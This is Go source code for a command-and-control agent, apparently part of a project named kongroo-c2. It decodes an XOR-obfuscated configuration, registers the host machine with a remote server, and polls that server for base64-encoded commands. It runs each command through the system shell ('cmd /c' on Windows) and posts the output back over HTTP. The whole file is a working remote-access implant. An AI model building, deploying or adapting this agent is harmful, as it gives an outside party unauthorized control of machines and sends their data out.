package main

import (
	"bytes"
	"crypto/md5"
	b64 "encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"strconv"

	//"log"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"

	"gitlab.com/mgdi/kongroo-c2/agent/config"
)

type command struct {
	task   string
	result string
}

func encryptDecrypt(input string, key int) (output string) {
	for i := 0; i < len(input); i++ {
		if input[i] == 0x00 {
			break
		}
		output += string(input[i] ^ byte(key))
	}
	return output
}
func registerKongrooAgent(hostname, pcname, pcid, timestamp, platform string) {

	httpposturl := "http://" + hostname + ":8080/reg/" + pcid
	var jsonData = []byte(fmt.Sprintf(`{
		"PCID": "%s",
		"Name": "%s",
		"IP": "",
		"Platform": "%s",
		"Timestamp": "%s"
	}`, pcid, pcname, platform, timestamp))
	request, err := http.NewRequest("POST", httpposturl, bytes.NewBuffer(jsonData))
	request.Header.Set("Content-Type", "application/json; charset=UTF-8")

	client := &http.Client{}
	response, err := client.Do(request)
	if err != nil {
		panic(err)
	}
	defer response.Body.Close()
	// fmt.Println("response Status:", response.Status)
	// fmt.Println("response Headers:", response.Header)
	// body, _ := ioutil.ReadAll(response.Body)
	// fmt.Println("response Body:", string(body))
}
func checkNewTasks(hostname, pcid string) (string, bool) {
	resp, err := http.Get("http://" + hostname + ":8080/tasks/" + pcid)
	if err != nil {
		// log.Fatalln(err)
		return "", false
	}
	if resp.StatusCode == 404 {
		return "", false
	}
	//We Read the response body on the line below.
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		// log.Fatal(err)

		return "", false
	}
	//Convert the body to type string
	if len(body) == 0 {
		return "", false
	}
	body = body[:]
	sEnc := string(body)
	sDec, _ := b64.StdEncoding.DecodeString(sEnc)
	// log.Printf(string(sDec))
	return string(sDec), true

}
func executeTask(task, platform string) command {
	var result []byte
	// var err error

	switch platform {
	case "linux":
		splitTask := strings.Split(task, " ")
		result, _ = exec.Command(splitTask[0], splitTask[1:]...).CombinedOutput()
		// log.Println("Result of command", string(result), "error", err)
	case "windows":
		result, _ = exec.Command("cmd", "/c", task).CombinedOutput()
	default:
		result = []byte("")

	}

	sEnc := b64.StdEncoding.EncodeToString(result)
	taskResult := command{
		task:   task,
		result: string(sEnc),
	}
	//log.Println("Sending", taskResult.result)
	return taskResult
}

func postResults(hostname, pcid string, result command) {
	httpposturl := "http://" + hostname + ":8080/tasks/" + pcid
	var jsonData = []byte(fmt.Sprintf(`{
		"Command": "%s",
		"Output": "%s"
	}`, result.task, string(result.result)))

	request, _ := http.NewRequest("POST", httpposturl, bytes.NewBuffer(jsonData))
	request.Header.Set("Content-Type", "application/json; charset=UTF-8")

	client := &http.Client{}
	_, err := client.Do(request)

	if err != nil {
		panic(err)
	}
	// _, err := http.Post("http://"+hostname+"/tasks/"+pcname,
	// 	"application/x-www-form-urlencoded",
	// 	strings.NewReader(b64.StdEncoding.EncodeToString(result)))
	// if err != nil {
	// 	fmt.Println(err)
	// }

}
func changeDirectory(dir string) {
	os.Chdir(dir)
}
func main() {
	decrypted := encryptDecrypt(config.CONF_BUFFER, 75)
	var configs config.Config
	json.Unmarshal([]byte(decrypted), &configs)
	/*
		k, err := registry.OpenKey(registry.LOCAL_MACHINE, 'SOFTWARE\Microsoft\Windows NT\CurrentVersion', registry.QUERY_VALUE)
		if err != nil {
			log.Fatal(err)
		}
		defer k.Close()
		platform, _, err := k.GetStringValue("CurrentVersion")
		if err != nil {
			log.Fatal(err)
		}
	*/

	platform := runtime.GOOS
	pcname, err := os.Hostname()
	if err != nil {
		pcname = "ERRORHOSTNAME"
	}
	t := time.Now()
	tUnix := strconv.FormatInt(t.Unix(), 10)
	hasher := md5.New()
	hasher.Write([]byte(pcname + string(tUnix)))
	pcid := hex.EncodeToString(hasher.Sum(nil))
	pcid = pcid[:6]
	// log.Println(pcid)
	//Register new agent
	registerKongrooAgent(configs.Hostname, pcname, pcid, tUnix, platform)
	sleepTimer := 2
	for {
		if task, ok := checkNewTasks(configs.Hostname, pcid); ok == true {
			if splitTask := strings.Split(task, " "); splitTask[0] == "cd" {
				changeDirectory(strings.Join(splitTask[1:], " "))
			} else {
				result := executeTask(task, platform)
				postResults(configs.Hostname, pcid, result)
			}
			if sleepTimer > 3 {
				sleepTimer -= 2
			}

		} else if sleepTimer < 10 {
			sleepTimer += 2
		}
		time.Sleep(time.Duration(sleepTimer) * time.Second)
	}
}
